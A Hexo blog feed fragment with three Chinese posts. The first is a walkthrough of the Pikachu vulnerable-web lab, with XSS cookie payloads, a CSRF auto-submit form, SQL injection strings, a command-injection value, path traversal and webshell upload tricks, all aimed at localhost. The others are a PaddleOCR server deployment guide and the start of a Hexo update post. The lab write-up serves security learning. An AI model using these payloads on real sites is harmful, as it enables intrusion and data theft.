onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>观察js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line">    <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本关与前一关的方法一致，区别就是这次是从url中获取我们输入的text参数，类似反射型</p><h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><p>盲打即在前端无法看到攻击是否成功，因为XSS注入语句没有直接拼入当前页面的HTML</p><p>但是本题提示输入的内容保存在了后台页面，我们在注入后访问admin_login.php</p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><p>先尝试<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><img src="/posts/975e18bab440/image-20240418160528165.png" class="" title="image-20240418160528165"><p>只剩下一个<code>&gt;</code>，猜测script关键字被过滤</p><p>使用a标签绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><p>尝试注入语句<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p>发现被传入了href的属性</p><img src="/posts/975e18bab440/image-20240418163809731.png" class="" title="image-20240418163809731"><p>构造如下语句绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure><p>仍然注入失败，查看源代码，发现进行了htmlspecialchars编码过滤</p><img src="/posts/975e18bab440/image-20240418165902770.png" class="" title="image-20240418165902770"><p>htmlspecialchars编码规则如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;：转换为&amp;amp;</span><br><span class="line">&quot;：转换为&amp;quot;</span><br><span class="line">&#x27;：转换为成为 &#x27;</span><br><span class="line">&lt;：转换为&amp;lt;</span><br><span class="line">&gt;：转换为&amp;gt;</span><br></pre></td></tr></table></figure><p>当然有时候该函数被设置为仅过滤双引号（默认设置下），这需要我们试出来</p><p>修改刚刚的注入语句</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(document.cookie)</span><br></pre></td></tr></table></figure><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>传入的内容放在href属性中</p><img src="/posts/975e18bab440/image-20240418165228358.png" class="" title="image-20240418165228358"><p>尝试上一关的注入语句<code>&#39; onclick=&#39;alert(document.cookie)</code></p><p>注入失败，查看源代码</p><img src="/posts/975e18bab440/image-20240418165726593.png" class="" title="image-20240418165726593"><p>发现单引号被编码了</p><p>由于链接标签里可以通过在 href 中使用 <code>javascript:xxx</code>来执行 JavaScript</p><p>构造注入语句<code>javascript:alert(document.cookie)</code></p><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>查看页面元素和源代码</p><img src="/posts/975e18bab440/image-20240418171112383.png" class="" title="image-20240418171112383"><p>输入被传给了ms</p><p>我们可以尝试闭合源代码中原有的<code>&lt;script&gt;</code>标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>使用提示的账户密码登录到其中一个账号</p><p>修改个人信息，提交并使用bp抓包</p><img src="/posts/975e18bab440/image-20240418193012554.png" class="" title="image-20240418193012554"><p>抓到的数据包如下</p><img src="/posts/975e18bab440/image-20240418193119269.png" class="" title="image-20240418193119269"><p>请求的URL和请求体中并没有看到token，说明没有防CSRF的措施</p><p>我们将住址改为You are hacked</p><p>构造的链接为<code>http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=110&amp;add=You+are+hacked&amp;email=114514%40gmail.com&amp;submit=submit</code></p><p>接下来我们登录到另一个用户，并新建一个标签页并访问构造的链接，用于模拟用户点击恶意链接</p><img src="/posts/975e18bab440/image-20240418193835782.png" class="" title="image-20240418193835782"><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>遇到目标参数在请求体中传输，即POST传参的情况时，我们可以构造一个html网站并引诱用户点击</p><p>在该站点中发送post请求到目标网站</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf_post<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;boy&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;110&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;china&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Hacked by R1ck&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在靶场环境中新建一个html页面<code>csrf.html</code>并放入上面的代码</p><p>访问该网页<code>http://127.0.0.1/pikachu/csrf.html</code></p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>由于服务器生成了token，每次像后端服务器提交请求都需要验证token</p><p>而当我们刷新页面时token值会发生变化，所以CSRF漏洞无法生效</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>查询一下发现是post注入类型</p><img src="/posts/975e18bab440/image-20240418231035262.png" class="" title="image-20240418231035262"><p>判断一下id是不是注入点，由于题目提示是数字型，所以不需要考虑闭合引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1000</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><img src="/posts/975e18bab440/image-20240418232006423.png" class="" title="image-20240418232006423"><p>按照SQL注入的流程，先找字段数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> n</span><br></pre></td></tr></table></figure><p>一共两个字段，确认字段数量是为了后续联合注入的字段数与主查询一致</p><p>接下来就是用联合查询开始脱库</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><img src="/posts/975e18bab440/image-20240418234230895.png" class="" title="image-20240418234230895"><p>字符型要多考虑引号的闭合</p><p>这里我们把目标设简单一些，爆出当前表的所有用户名和邮箱</p><p>注入语句为<code>&#39; or 1=1 --</code></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>和字符型类似，我们闭合引号即可</p><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><p>这一关的后端源码中SQL语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username<span class="operator">=</span>(<span class="string">&#x27;$name&#x27;</span>)</span><br></pre></td></tr></table></figure><p>所以除了引号，我们还需要闭合前面的括号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx<span class="string">&#x27;) or 1=1 -- </span></span><br></pre></td></tr></table></figure><h3 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert/update注入"></a>insert/update注入</h3><p>本关有两个注入点，注册时会向数据库插入数据，是一个注入点</p><p>登录后修改信息会更新数据库条目，也是一个注入点</p><p>这两个注入点都可以使用报错注入，因为原SQL语句不提供select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span></span><br></pre></td></tr></table></figure><p>后侧使用<code>and &#39;</code>闭合即可</p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>执行删除留言的操作，并使用bp抓包</p><img src="/posts/975e18bab440/image-20240419104102890.png" class="" title="image-20240419104102890"><p>只传递了一个参数id</p><p>猜测语句为<code>delete from message where id=&#123;$_GET[&#39;id&#39;]&#125;&quot;</code></p><p>此时由于是数字型注入点，不需要考虑引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>需要注意的是由于是Get传参，所以需要url编码一下</p><h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><img src="/posts/975e18bab440/image-20240419105712696.png" class="" title="image-20240419105712696"><p>登录后提示几个请求头的信息被记录，也就是插入数据库</p><p>使用bp抓包，选择刚刚的其中一个请求头，使用报错注入<code>&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#39;</code></p><img src="/posts/975e18bab440/image-20240419110257060.png" class="" title="image-20240419110257060"><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节注入只需在注入语句的引号前加上<code>%df</code></p><img src="/posts/975e18bab440/image-20240419152919922.png" class="" title="image-20240419152919922"><h2 id="远程命令-代码执行"><a href="#远程命令-代码执行" class="headerlink" title="远程命令/代码执行"></a>远程命令/代码执行</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p><code>127.0.0.1 &amp; ipconfig</code></p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>说实话这个靶场做的真的很一般，连关卡名称都能打错</p><p>提交<code>phpinfo()；</code>，可以查看该站点的phpinfo信息</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>测试一下页面，发现URL的filename中传入了文件</p><img src="/posts/975e18bab440/image-20240419171637724.png" class="" title="image-20240419171637724"><p>更改该文件名称，例如查看后台的配置文件<code>../../../../Windows/System32/drivers/etc/hosts</code></p><p>当然也可以爆破同目录下的重要文件</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>本关需要在小皮面板中打开远程文件包含的配置</p><img src="/posts/975e18bab440/image-20240419173134003.png" class="" title="image-20240419173134003"><h2 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h2><p>本关修改filename参数，通过目录遍历的方法可以下载到敏感文件</p><h2 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>将一句话木马文件的后缀改为允许的jpg后上传，然后使用bp拦包修改后缀</p><img src="/posts/975e18bab440/image-20240419181254493.png" class="" title="image-20240419181254493"><h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>MIME检验在服务端</p><p>这一关同样可以使用bp抓包，要注意的是<code>Content-Tyoe</code>应该是允许的类型</p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>要绕过该函数的检测，我们可以伪造图片的16进制头部字符串，当然更简单的方法是将图片和php文件合成为一个图片</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy test.jpg + test.php synth.jpg</span><br></pre></td></tr></table></figure><p>上传<code>synth.jpg</code>，后续结合本地文件包含漏洞组合攻击</p><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>登录后查看个人信息，bp抓包后将username参数改成其他账号的用户名即可</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>抓一下管理员新增用户时的包，查看URI</p><img src="/posts/975e18bab440/image-20240419192149198.png" class="" title="image-20240419192149198"><p>退出登录后，切换成普通用户，使用刚刚的目录</p><img src="/posts/975e18bab440/image-20240419192357418.png" class="" title="image-20240419192357418"><img src="/posts/975e18bab440/image-20240419192449372.png" class="" title="image-20240419192449372"><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>使用<code>../dir.php</code>，可以将上一级页面的内容展示出来</p><img src="/posts/975e18bab440/image-20240419193628192.png" class="" title="image-20240419193628192"><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>查看源代码</p><img src="/posts/975e18bab440/image-20240419193900071.png" class="" title="image-20240419193900071"><p>登录后抓包，cookie中也泄露了很多</p><img src="/posts/975e18bab440/image-20240419194012103.png" class="" title="image-20240419194012103">]]></content>
      
      
      <categories>
          
          <category> 靶场通关记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaddleOCR服务端API部署</title>
      <link href="/posts/ae013fcef565/"/>
      <url>/posts/ae013fcef565/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参加竞赛的软件需要使用服务端-客户端模型，前几天把内网穿透搭好之后，现在就可以着手服务端API的部署</p><p>软件中除了一些论文模型，我们还计划使用一些大厂的OCR推理模型，当然其中就包括PaddleOCR，所以这篇文章就用于记录PaddleOCR的搭建过程</p><h2 id="Paddle环境搭建"><a href="#Paddle环境搭建" class="headerlink" title="Paddle环境搭建"></a>Paddle环境搭建</h2><h3 id="安装PaddlePaddle"><a href="#安装PaddlePaddle" class="headerlink" title="安装PaddlePaddle"></a>安装PaddlePaddle</h3><p>首先访问PaddlePadlle的官网：<a href="https://www.paddlepaddle.org.cn/">https://www.paddlepaddle.org.cn/</a></p><p>和Pytorch官网十分类似，我们选择服务端平台的相应配置即可</p><div class="note warning flat"><p>需要注意的是，<code>paddle_serving_client</code>库需要用到<code>paddle.fluid</code>模块，而新版PaddlePaddle已经将其删除，所以我们需要安装一个旧一些的版本</p></div><p>选择旧版本安装</p><img src="/posts/ae013fcef565/image-20240202202044332.png" class="" title="image-20240202202044332"><p>这里我选择2.4.2版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CUDA 11.2</span></span><br><span class="line">python3 -m pip install paddlepaddle-gpu==2.4.2.post112 -f https://www.paddlepaddle.org.cn/whl/linux/mkl/avx/stable.html</span><br></pre></td></tr></table></figure><h3 id="安装PaddleOCR"><a href="#安装PaddleOCR" class="headerlink" title="安装PaddleOCR"></a>安装PaddleOCR</h3><p>这里我们直接安装官方发布的最新版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install paddleocr==2.7.0.3</span><br></pre></td></tr></table></figure><p>除了安装pip包，我们还需要将PaddleOCR的github库克隆下来，由于该项目较大，我们选择下载为压缩包后到本地解压</p><h3 id="准备PaddleServing的运行环境"><a href="#准备PaddleServing的运行环境" class="headerlink" title="准备PaddleServing的运行环境"></a>准备PaddleServing的运行环境</h3><p>进入pdserving的工作目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd PaddleOCR/deploy/pdserving/</span><br></pre></td></tr></table></figure><p>安装serving，用于启动服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://paddle-serving.bj.bcebos.com/test-dev/whl/paddle_serving_server_gpu-0.8.3.post112-py3-none-any.whl</span><br><span class="line">pip3 install paddle_serving_server_gpu-0.8.3.post112-py3-none-any.whl</span><br></pre></td></tr></table></figure><p>安装client，用于转换模型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://paddle-serving.bj.bcebos.com/test-dev/whl/paddle_serving_client-0.8.3-cp38-none-any.whl</span><br><span class="line">pip3 install paddle_serving_client-0.8.3-cp38-none-any.whl</span><br></pre></td></tr></table></figure><p>安装serving-app</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://paddle-serving.bj.bcebos.com/test-dev/whl/paddle_serving_app-0.8.3-py3-none-any.whl</span><br><span class="line">pip install paddle_serving_app-0.8.3-py3-none-any.whl</span><br></pre></td></tr></table></figure><h2 id="模型转换"><a href="#模型转换" class="headerlink" title="模型转换"></a>模型转换</h2><p>下载PP-OCR的推理模型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载并解压 OCR 文本检测模型</span></span><br><span class="line">wget https://paddleocr.bj.bcebos.com/PP-OCRv3/chinese/ch_PP-OCRv3_det_infer.tar -O ch_PP-OCRv3_det_infer.tar &amp;&amp; tar -xf ch_PP-OCRv3_det_infer.tar</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载并解压 OCR 文本识别模型</span></span><br><span class="line">wget https://paddleocr.bj.bcebos.com/PP-OCRv3/chinese/ch_PP-OCRv3_rec_infer.tar -O ch_PP-OCRv3_rec_infer.tar &amp;&amp;  tar -xf ch_PP-OCRv3_rec_infer.tar</span><br></pre></td></tr></table></figure><p>用安装的paddle_serving_client把下载的inference模型转换成易于server部署的模型格式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转换检测模型</span></span><br><span class="line">python3 -m paddle_serving_client.convert --dirname ./ch_PP-OCRv3_det_infer/ \</span><br><span class="line">                                         --model_filename inference.pdmodel          \</span><br><span class="line">                                         --params_filename inference.pdiparams       \</span><br><span class="line">                                         --serving_server ./ppocr_det_v3_serving/ \</span><br><span class="line">                                         --serving_client ./ppocr_det_v3_client/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转换识别模型</span></span><br><span class="line">python3 -m paddle_serving_client.convert --dirname ./ch_PP-OCRv3_rec_infer/ \</span><br><span class="line">                                         --model_filename inference.pdmodel          \</span><br><span class="line">                                         --params_filename inference.pdiparams       \</span><br><span class="line">                                         --serving_server ./ppocr_rec_v3_serving/  \</span><br><span class="line">                                         --serving_client ./ppocr_rec_v3_client/</span><br></pre></td></tr></table></figure><p>转换后可以得到下面四个新文件夹</p><img src="/posts/ae013fcef565/image-20240202202433853.png" class="" title="image-20240202202433853"><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>在pdserver目录下执行如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 web_service.py --config=config.yml &amp;&gt;log.txt &amp;</span><br></pre></td></tr></table></figure><p>此时，paddleocr服务进程会在后台部署，并将日志记录在log.txt中</p>]]></content>
      
      
      
        <tags>
            
            <tag> Paddle </tag>
            
            <tag> OCR </tag>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次hexo及butterfly版本更新</title>
      <link href="/posts/4a2dc63ff98e/"/>
      <url>/posts/4a2dc63ff98e/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近放假闲来无事，想着更新一下博客使用的hexo和butterfly版本</p><p>不改不知道，先前在原版主题上做的一些魔改已经让更新版本不再是替换文件那么简单了</p><p>所以在本文中我打算记录一下这次版本更新的一些经验，并记录一下我做的一些魔改，方便下次版本更新时查阅</p><h2 id="准备新版框架"><a href="#准备新版框架" class="headerlink" title="准备新版框架"></a>准备新版框架</h2><h3 id="安装新版nodejs"><a href="#安装新版nodejs" class="headerlink" title="安装新版nodejs"></a>安装新版nodejs</h3><p>升级nodejs的无脑方法即<strong>卸载重装</strong>，因为这台电脑的环境中没有装太多nodejs的包，所以卸载起来没有太大心理压力</p><details class="toggle" ><summary class="toggle-button" style="">nodejs重装步骤</summary><div class="toggle-content"><ol><li><p>Win菜单中搜索<code>Uninstall Node.js</code>卸载程序，<strong>运行卸载程序</strong>。</p><p><img src="/posts/4a2dc63ff98e/image-20240201143924678.png" class="" title="image-20240201143924678"></p></li><li><p>删除<code>C:\Users\用户名\AppData\Local\</code>目录下的<code>npm-cache</code></p></li><li><p>在<a href="https://nodejs.cn/download/">nodejs官网</a>下载最新版安装包</p><p><img src="/posts/4a2dc63ff98e/image-20240201152825687.png" class="" title="image-20240201152825687"></p></li><li><p>双击下载的msi文件，安装新版nodejs</p><p><img src="/posts/4a2dc63ff98e/image-20240201204201683.png" class="" title="image-20240201204201683"></p><p>这一步不需要勾选安装必要工具</p></li><li><p>查看是否已自动配置环境变量</p><p><img src="/posts/4a2dc63ff98e/image-20240201204506357.png" class="" title="image-20240201204506357"></p></li><li><p>更改缓存及安装包的存放位置</p><p>在安装目录下新建两个文件夹<code>node_global</code>和<code>node_cache</code></p><p>在<strong>管理员身份下</strong>打开cmd命令窗口，输入下面两条指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;D:\nodejs\node_global&quot;</span><br><span class="line">npm config set cache &quot;D:\nodejs\node_cache&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/4a2dc63ff98e/image-20240201204959710.png" class="" title="image-20240201204959710"></p></li><li><p><strong>新建环境变量</strong></p><p>在<code>node_global</code>目录下新建<code>node_modules</code>文件夹</p><p>在<code>系统变量</code>中新建下面这条</p><p>变量名：<code>NODE_PATH</code></p><p>变量值：<code>D:\nodejs\node_global\node_modules</code></p><p>编辑<code>用户变量</code>中的<code>Path</code>，将默认的 C 盘下 <code>AppData\Roaming\npm</code> 修改成 <code>node_global</code>的路径</p><p>在<code>系统变量</code>的<code>Path</code>中新增<code>%NODE_PATH%</code></p><p><img src="/posts/4a2dc63ff98e/image-20240201210053833.png" class="" title="image-20240201210053833"></p></li><li><p>执行<code>node -v</code>查看版本</p><p><img src="/posts/4a2dc63ff98e/image-20240201210339538.png" class="" title="image-20240201210339538"></p></li></ol></div></details><h3 id="安装新版hexo"><a href="#安装新版hexo" class="headerlink" 